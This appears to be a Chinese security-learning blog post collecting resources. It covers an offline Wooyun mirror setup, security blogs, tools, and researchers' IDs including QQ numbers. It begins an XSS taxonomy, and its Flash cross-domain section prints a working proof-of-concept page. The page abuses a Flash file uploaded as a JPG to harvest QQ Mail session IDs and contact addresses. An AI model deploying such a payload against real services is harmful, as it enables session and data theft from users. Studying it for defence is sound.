{"title":"安全学习入门及其资料收集","slug":"个人规划/安全学习入门及其资料收集","date":"2019-07-08T06:36:30.000Z","updated":"2022-03-23T08:03:01.706Z","url":"2019/7-8-2.html","path":"api/articles/2019/7-8-2.html.json","covers":null,"content":"<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言简述\"><a href=\"#0x00-前言简述\" class=\"headerlink\" title=\"0x00 前言简述\"></a>0x00 前言简述</h4><p>所谓工欲善其事必先利其器以下是学习网络安全必备:</p>\n<ul>\n<li>(1) Wooyun镜像站本地离线搭建:php5.6 (需要安装mysql扩展-用xampp即可注意PHP与数据库版本)<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 乌云漏洞库</span></span><br><span class=\"line\">https://pan.baidu.com/s/1oJr2eWtcgYSe1tp5o26tBw 提取码：g3l7</span><br><span class=\"line\"><span class=\"comment\"># 乌云知识库</span></span><br><span class=\"line\">https://github.com/SuperKieran/WooyunDrops</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#存放路径：</span></span><br><span class=\"line\">phpstudy</span><br><span class=\"line\">      ├─WWW</span><br><span class=\"line\">          ├─Bugs.zip(解压后是Bugs文件夹)</span><br><span class=\"line\">                ├─conn.php(修改里面的数据库用户名和密码)</span><br><span class=\"line\">          ├─upload(自己创建)</span><br><span class=\"line\">                  ├─10-14.zip(拖到这里解压)</span><br><span class=\"line\">                  ├─15-a.zip(拖到这里解压)</span><br><span class=\"line\">                  ├─15-b.zip(拖到这里解压)</span><br><span class=\"line\">                  ├─16.zip(拖到这里解压)</span><br><span class=\"line\">          |-static (乌云知识库)</span><br><span class=\"line\">      ├─MySQL</span><br><span class=\"line\">            ├─data</span><br><span class=\"line\">                 ├─wooyun(自己创建)</span><br><span class=\"line\">                        ├─wooyun.zip(拖到这里解压)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><br></p>\n<p><strong>问题解决:</strong><br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">-- #(1) 开启php短标签编辑php.ini或者加上将&lt;? ?&gt;变成`&lt;?php ?&gt;`</span></span><br><span class=\"line\">short_open_tag = On</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- #(2) 图片不能正常显示的两种解决方法</span></span><br><span class=\"line\">192.168.150.130 static.loner.fm</span><br><span class=\"line\"><span class=\"keyword\">UPDATE</span> wooyun.bugs <span class=\"keyword\">SET</span> article_title = <span class=\"keyword\">replace</span>(article_title, <span class=\"string\">'static.loner.fm'</span>, <span class=\"string\">'192.168.150.130'</span>) ;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- #(3) 记录是否看过该篇乌云漏洞</span></span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> <span class=\"built_in\">record</span> (</span><br><span class=\"line\"> <span class=\"keyword\">id</span> <span class=\"built_in\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span>  PRIMARY <span class=\"keyword\">KEY</span> AUTO_INCREMENT,</span><br><span class=\"line\"> wybug_id longtext <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span>,</span><br><span class=\"line\"> rtime datetime,</span><br><span class=\"line\"> <span class=\"keyword\">INDEX</span> mul_index (wybug_id)</span><br><span class=\"line\">);</span><br><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> <span class=\"string\">`record`</span> <span class=\"keyword\">ADD</span> <span class=\"keyword\">UNIQUE</span> (<span class=\"string\">`wybug_id`</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- #(4) 记录是否看过该篇乌云知识库</span></span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> recordbook (</span><br><span class=\"line\"> <span class=\"keyword\">id</span> <span class=\"built_in\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span>  PRIMARY <span class=\"keyword\">KEY</span> AUTO_INCREMENT,</span><br><span class=\"line\"> page_id longtext <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span>,</span><br><span class=\"line\"> rtime datetime,</span><br><span class=\"line\"> <span class=\"keyword\">INDEX</span> mul_index (page_id)</span><br><span class=\"line\">);</span><br><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> <span class=\"string\">`recordbook`</span> <span class=\"keyword\">ADD</span> <span class=\"keyword\">UNIQUE</span> (<span class=\"string\">`page_id`</span>);</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h4 id=\"0x01-安全学习\"><a href=\"#0x01-安全学习\" class=\"headerlink\" title=\"0x01 安全学习\"></a>0x01 安全学习</h4><h5 id=\"0-安全漏洞发布网站\"><a href=\"#0-安全漏洞发布网站\" class=\"headerlink\" title=\"0.安全漏洞发布网站\"></a>0.安全漏洞发布网站</h5><ul>\n<li><a href=\"https://seclists.org\" target=\"_blank\" rel=\"noopener\">https://seclists.org</a> #Nmap与漏洞披露</li>\n</ul>\n<p><br></p>\n<h5 id=\"1-安全相关自媒体网站\"><a href=\"#1-安全相关自媒体网站\" class=\"headerlink\" title=\"1.安全相关自媒体网站\"></a>1.安全相关自媒体网站</h5><ul>\n<li><a href=\"https://www.net-square.com/\" target=\"_blank\" rel=\"noopener\">https://www.net-square.com/</a></li>\n</ul>\n<p><br></p>\n<h5 id=\"2-安全研究团队网站\"><a href=\"#2-安全研究团队网站\" class=\"headerlink\" title=\"2.安全研究团队网站\"></a>2.安全研究团队网站</h5><ul>\n<li><a href=\"https://www.w3bsafe.cn/\" target=\"_blank\" rel=\"noopener\">https://www.w3bsafe.cn/</a></li>\n<li><a href=\"https://www.dafsec.org/\" target=\"_blank\" rel=\"noopener\">https://www.dafsec.org/</a></li>\n</ul>\n<p><br></p>\n<h5 id=\"3-安全圈个人blog\"><a href=\"#3-安全圈个人blog\" class=\"headerlink\" title=\"3.安全圈个人blog\"></a>3.安全圈个人blog</h5><ul>\n<li><a href=\"https://c1h2e1.github.io/\" target=\"_blank\" rel=\"noopener\">https://c1h2e1.github.io/</a></li>\n<li><a href=\"https://gh0st.cn\" target=\"_blank\" rel=\"noopener\">https://gh0st.cn</a></li>\n<li><a href=\"http://infosecflash.com/\" target=\"_blank\" rel=\"noopener\">http://infosecflash.com/</a></li>\n<li><a href=\"https://ahussam.me\" target=\"_blank\" rel=\"noopener\">https://ahussam.me</a></li>\n<li><a href=\"https://0xpatrik.com\" target=\"_blank\" rel=\"noopener\">https://0xpatrik.com</a></li>\n<li><a href=\"https://thehackerblog.com\" target=\"_blank\" rel=\"noopener\">https://thehackerblog.com</a></li>\n<li><a href=\"https://www.hahwul.com\" target=\"_blank\" rel=\"noopener\">https://www.hahwul.com</a></li>\n<li><a href=\"https://pentester.land\" target=\"_blank\" rel=\"noopener\">https://pentester.land</a></li>\n<li><a href=\"https://www.mrwu.red\" target=\"_blank\" rel=\"noopener\">https://www.mrwu.red</a></li>\n<li><a href=\"https://byt3bl33d3r.github.io/\" target=\"_blank\" rel=\"noopener\">https://byt3bl33d3r.github.io/</a></li>\n</ul>\n<h5 id=\"5-网络ID信息收集\"><a href=\"#5-网络ID信息收集\" class=\"headerlink\" title=\"5.网络ID信息收集\"></a>5.网络ID信息收集</h5><p>C1h2e1-QQ1119544572-Twitter@C1h2e11<br>蝉鸣月下独悲凉-1921409907-Team@W3bsafe<br>Vulkey_Chen<br>0ang3el<br>byt3bl33d3r</p>\n<hr>\n<h4 id=\"0x02-安全工具\"><a href=\"#0x02-安全工具\" class=\"headerlink\" title=\"0x02 安全工具\"></a>0x02 安全工具</h4><h5 id=\"1-Github项目\"><a href=\"#1-Github项目\" class=\"headerlink\" title=\"1.Github项目\"></a>1.Github项目</h5><p><strong>代理翻墙</strong><br><a href=\"https://github.com/shadowsocks/\" target=\"_blank\" rel=\"noopener\">https://github.com/shadowsocks/</a>  </p>\n<p><strong>网络空间指纹扫描器</strong></p>\n<ul>\n<li><a href=\"https://github.com/nanshihui/Scan-T\" target=\"_blank\" rel=\"noopener\">https://github.com/nanshihui/Scan-T</a></li>\n</ul>\n<p><strong>Web安全模糊测试工具</strong></p>\n<ul>\n<li><a href=\"https://github.com/xmendez/wfuzz\" target=\"_blank\" rel=\"noopener\">https://github.com/xmendez/wfuzz</a></li>\n</ul>\n<p><strong>Fuzz脚本字典</strong></p>\n<ul>\n<li><a href=\"https://github.com/fuzzdb-project/fuzzdb\" target=\"_blank\" rel=\"noopener\">https://github.com/fuzzdb-project/fuzzdb</a></li>\n<li><a href=\"https://github.com/danielmiessler/SecLists\" target=\"_blank\" rel=\"noopener\">https://github.com/danielmiessler/SecLists</a></li>\n</ul>\n<hr>\n<h4 id=\"0x03-安全漏洞分类\"><a href=\"#0x03-安全漏洞分类\" class=\"headerlink\" title=\"0x03 安全漏洞分类\"></a>0x03 安全漏洞分类</h4><h4 id=\"1-前端漏洞\"><a href=\"#1-前端漏洞\" class=\"headerlink\" title=\"1.前端漏洞\"></a>1.前端漏洞</h4><h5 id=\"XSS-跨站脚本攻击-Cross-Site-Script\"><a href=\"#XSS-跨站脚本攻击-Cross-Site-Script\" class=\"headerlink\" title=\"XSS-跨站脚本攻击(Cross Site Script)\"></a>XSS-跨站脚本攻击(Cross Site Script)</h5><p>描述:一种 Web 应用程序的漏洞，来自用户的不可信数据在没有验证情况下被应用程序进行了处理，没有<code>正确转义（escape）</code>或<code>编码（encode）</code>反射回浏览器，导致浏览器引擎执行了非预期代码。</p>\n<ul>\n<li><p>1.XSS:</p>\n<ul>\n<li>存储型XSS(持久型)</li>\n<li>反射型XSS / 非持久型</li>\n<li>DOM based XSS </li>\n</ul>\n</li>\n<li><p>2.Flash:</p>\n</li>\n</ul>\n<p>Flash跨域数据挟持</p>\n<p>以图像包装的Flash文件在victim.com上传然后于attacker.com下嵌入,此时它<code>只能在attacker.com下执行JavaScript(由于同源策略)</code>, 但是假如该Flash文件发出请求那么它可以读取到victim.com下的文件前提是crossdomain文件中允许访问的域包括了，我们上传的swf的地址域名;<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">object</span> <span class=\"attr\">style</span>=<span class=\"string\">\"height:1px;width:1px;\"</span> <span class=\"attr\">data</span>=<span class=\"string\">\"http://victim.com/user/2292/profilepicture.jpg\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"application/x-shockwave-flash\"</span> <span class=\"attr\">allowscriptaccess</span>=<span class=\"string\">\"always\"</span> <span class=\"attr\">flashvars</span>=<span class=\"string\">\"c=read&amp;u=http://victim.com/secret_file.txt\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">object</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>just for fun<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t<span class=\"keyword\">var</span> test = <span class=\"number\">1</span>;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t<span class=\"keyword\">var</span> sid;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t<span class=\"keyword\">var</span> uid;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t<span class=\"keyword\">var</span> resultCon = <span class=\"string\">''</span>;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sendToJavaScript</span><span class=\"params\">(strData)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\tregexp = <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"regexp\">/([a-zA-Z0-9_\\.\\-])+\\@(([a-zA-Z0-9\\-])+\\.)+([a-zA-Z0-9]&#123;2,4&#125;)+/g</span>);</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t<span class=\"keyword\">if</span> ((result = regexp.exec(strData)) != <span class=\"literal\">null</span>) &#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\tresultCon = resultCon + <span class=\"string\">'users:  '</span> + result[<span class=\"number\">0</span>] + <span class=\"string\">'&lt;br /&gt;'</span>;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\t<span class=\"keyword\">while</span> ((result = regexp.exec(strData)) != <span class=\"literal\">null</span>) &#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\t\tresultCon = resultCon + <span class=\"string\">'users:  '</span> + result[<span class=\"number\">0</span>] + <span class=\"string\">'&lt;br /&gt;'</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t<span class=\"built_in\">document</span>.write(resultCon);</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t<span class=\"comment\">// 匹配 SID </span></span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t<span class=\"keyword\">var</span> r1 = strData.match(<span class=\"regexp\">/subtemplate=ill&amp;sid=(.*?)&amp;/</span>);</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t<span class=\"keyword\">if</span> (r1 != <span class=\"literal\">null</span>) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\tsid = r1[1];</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\tresultCon = resultCon + <span class=\"string\">'sid:  '</span> + sid + <span class=\"string\">'&lt;br /&gt;'</span>;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\t<span class=\"keyword\">if</span> (test == <span class=\"number\">1</span>) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t\t<span class=\"keyword\">var</span> theDiv = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"havefun\"</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t\t<span class=\"keyword\">var</span> content = <span class=\"built_in\">document</span>.createTextNode(<span class=\"string\">\"\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\t\ttheDiv.appendChild(content);</span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">\t\t\t\t\ttheDiv.innerHTML += '<span class=\"tag\">&lt;<span class=\"name\">object</span> <span class=\"attr\">id</span>=<span class=\"string\">\"myObject\"</span> <span class=\"attr\">width</span>=<span class=\"string\">\"100\"</span> <span class=\"attr\">height</span>=<span class=\"string\">\"100\"</span> <span class=\"attr\">allowscriptaccess</span>=<span class=\"string\">\"always\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"application/x-shockwave-flash\"</span> <span class=\"attr\">data</span>=<span class=\"string\">\"http://join.qq.com/upload/photo/150914/439a57750ce65071b5cdbdaf0ce3bb7e.jpg\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">param</span> <span class=\"attr\">name</span>=<span class=\"string\">\"AllowScriptAccess\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"always\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">param</span> <span class=\"attr\">name</span>=<span class=\"string\">\"flashvars\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"input=http://set1.mail.qq.com/cgi-bin/laddr_lastlist?sid=' + sid + '%26t=addr_datanew%26category=hot\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">object</span>&gt;</span>';</span></span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\ttest++;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  just for fun</span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">havefun</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">object</span> <span class=\"attr\">id</span>=<span class=\"string\">\"myObject\"</span> <span class=\"attr\">width</span>=<span class=\"string\">\"100\"</span> <span class=\"attr\">height</span>=<span class=\"string\">\"100\"</span> <span class=\"attr\">allowscriptaccess</span>=<span class=\"string\">\"always\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"application/x-shockwave-flash\"</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t<span class=\"attr\">data</span>=<span class=\"string\">\"http://join.qq.com/upload/photo/150914/439a57750ce65071b5cdbdaf0ce3bb7e.jpg\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param</span> <span class=\"attr\">name</span>=<span class=\"string\">\"AllowScriptAccess\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"always\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param</span> <span class=\"attr\">name</span>=<span class=\"string\">\"flashvars\"</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t<span class=\"attr\">value</span>=<span class=\"string\">\"input=http://mail.qq.com/cgi-bin/mail_spam?action=check_link%26url=http://www.baidu.com\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">object</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"actionscript\">  <span class=\"comment\">//立即运行的匿名函数</span></span></span><br><span class=\"line\"><span class=\"actionscript\">\t!<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t<span class=\"keyword\">var</span> closed = <span class=\"literal\">false</span>,bdiv;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t<span class=\"keyword\">var</span> charset = <span class=\"built_in\">document</span>.charset || <span class=\"built_in\">document</span>.characterSet;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t<span class=\"keyword\">var</span> utf8 = [<span class=\"string\">'该页面的提供者尚未完成'</span>, <span class=\"string\">'实名认证'</span>, <span class=\"string\">'您的访问可能存在风险'</span>];</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t<span class=\"keyword\">var</span> gbk = [<span class=\"string\">'??ҳ????ṩ????δ???'</span>, <span class=\"string\">'ʵ????֤'</span>, <span class=\"string\">'???ķ??ʿ??ܴ??ڷ???'</span>];</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t<span class=\"keyword\">var</span> en = [<span class=\"string\">'The provider of this page is not'</span>, <span class=\"string\">'verified'</span>, <span class=\"string\">'there are risks when you visiting'</span>];</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">banner</span><span class=\"params\">()</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t<span class=\"keyword\">var</span> char = charset.toLowerCase(),</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\tlang = <span class=\"string\">''</span>;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t<span class=\"keyword\">switch</span> (<span class=\"literal\">true</span>) &#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\t<span class=\"keyword\">case</span> char.indexOf(<span class=\"string\">'utf'</span>) == <span class=\"number\">0</span>:</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\t\tlang = utf8;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\t\t<span class=\"keyword\">break</span>;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\t<span class=\"keyword\">case</span> char.indexOf(<span class=\"string\">'gb'</span>) == <span class=\"number\">0</span>:</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\t\tlang = gbk;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\t\t<span class=\"keyword\">break</span>;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\t<span class=\"keyword\">default</span>:</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\t\tlang = en;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t<span class=\"keyword\">var</span> _div =</span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">\t\t\t\t'<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"position:fixed;_position:absolute;top:0;left:0;right:0;padding:12px;background-color:rgba(0,0,0,0.5);filter: progid:DXImageTransform.Microsoft.gradient(startcolorstr=#7F000000,endcolorstr=#7F000000);color:#fff;text-align:center;font-size:16px;font-family:simsun,serif;cursor:default;z-index:2147483647;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">\"margin:0;padding:0;\"</span>&gt;</span>' +</span></span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\tlang[0] +</span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">\t\t\t\t' <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">style</span>=<span class=\"string\">\"text-decoration:none;color:#37afe4;\"</span> <span class=\"attr\">target</span>=<span class=\"string\">\"_blank\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://sae.sina.com.cn/?m=faq&amp;a=view&amp;doc_id=22\"</span>&gt;</span>' +</span></span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\tlang[<span class=\"number\">1</span>] + <span class=\"string\">'&lt;/a&gt; '</span> + lang[<span class=\"number\">2</span>] +</span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">\t\t\t\t'<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">style</span>=<span class=\"string\">\"position:absolute;right:12px;top:50%;font-size:20px;color:#fff;border:none;margin:0;padding:0;;margin-top:-10px;line-height:20px;background:none;cursor:pointer;font-family:Helvetica Neue, Helvetica, Arial, sans-serif;outline:none;\"</span>&gt;</span>x<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>',</span></span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\tdiv = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'div'</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\tdiv.innerHTML = _div;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t<span class=\"keyword\">var</span> close = div.getElementsByTagName(<span class=\"string\">'a'</span>)[<span class=\"number\">1</span>],</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\tx = 0,</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\ty = 0;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\tclose.onmouseover = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">(event)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t<span class=\"keyword\">var</span> e = event ? event : <span class=\"built_in\">window</span>.event;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\tx = e.clientX;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\ty = e.clientY;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t&#125;;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\tclose.onclick = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">(event)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">\t\t\t\t<span class=\"keyword\">if</span> (event &amp;&amp; 